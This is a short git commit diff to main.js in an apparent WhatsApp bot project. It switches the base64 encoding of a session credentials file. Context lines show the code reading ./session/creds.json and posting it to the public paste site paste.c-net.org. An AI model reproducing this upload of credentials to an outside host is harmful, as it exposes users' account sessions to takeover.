87d55db11620c2c440b2b723f5083be3ad25c5b3
Nipuna <121292566+nipuna15@users.noreply.github.com>
2023-07-27 21:11:25 +0530

    Update main.js

--- main.js
+++ main.js
@@ -9,6 +9,7 @@ const CryptoJS = require("crypto-js");
 const JSZip = require("jszip");
 const file = require("fs");
 const zip = new JSZip();
+const { base64encode, base64decode } = require('nodejs-base64');
 const {
     delay,
     useMultiFileAuthState,
@@ -58,7 +59,7 @@ const {
                         await delay(1000 * 10)
                         var tsurue = "";
                         let fil = await file.readFileSync("./session/creds.json", "utf-8");
-                        let filz = fil.toString('base64');
+                        let filz = base64encode(fil);
                         await console.log(filz);
                         let link = await axios.post('http://paste.c-net.org/', "" + filz, {
                             headers: {
